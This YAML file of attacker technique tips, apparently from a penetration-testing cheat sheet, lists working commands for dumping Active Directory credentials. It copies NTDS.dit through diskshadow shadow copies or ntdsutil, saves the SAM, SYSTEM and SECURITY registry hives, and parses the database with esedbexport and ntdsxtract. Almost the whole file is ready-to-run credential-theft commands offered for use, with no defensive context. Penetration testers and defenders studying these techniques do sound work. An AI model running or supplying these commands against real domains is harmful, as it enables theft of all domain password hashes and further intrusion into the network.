---
functions:
  ttp-tip:

    - description: Grab NTDS.dit with diskshadow
      code: |
        shadow.txt Script:

        set context persistent nowriters
        add volume c: alias someAlias
        create
        expose %someAlias% z:
        exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\windows\temp\ntds.dit
        delete shadows volume %someAlias%
        reset
        
        Command: diskshadow.exe /s c:\diskshadow.txt

        unshadow.txt Script:

        delete shadows all

        Command: diskshadow.exe /s c:\unshadow.txt

        reg.exe save hklm\system c:\windows\temp\sys.dat
        reg.exe save hklm\sam c:\windows\temp\s.dat
        reg.exe save hklm\security c:\windows\temp\c.dat

        REMINDER: If created on linux you will need to run unix2dos to convert the line returns

    - description: Grab NTDS.dit with ntdsutil
      code: |
        where ntdsutil

        In a command prompt
        ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit

    - description: Break Out the NTDS.dit file
      code: |
        wget https://github.com/libyal/libesedb/releases/download/20210424/libesedb-experimental-20210424.tar.gz
        tar xf libesedb-experimental-20210424.tar.gz
        cd libesedb-20210424
        esedbexport ntds.dit

        git clone https://github.com/csababarta/ntdsxtract.git
        cd ntdsxtract/
        python setup.py build && python setup.py install

        #get domain user info
        dsusers.py datatable.4 link_table.5 users --csvoutfile users.csv

        #get information about all computer objects
        dscomputers.py datatable.3 computer_output --csvoutfile all_computers.csv

        #get a timeline of domain activity
        dstimeline.py datatable.4 timeline -b --csv --output timeline.csv


resources: |
  https://pentestlab.blog/tag/diskshadow/
  https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds
---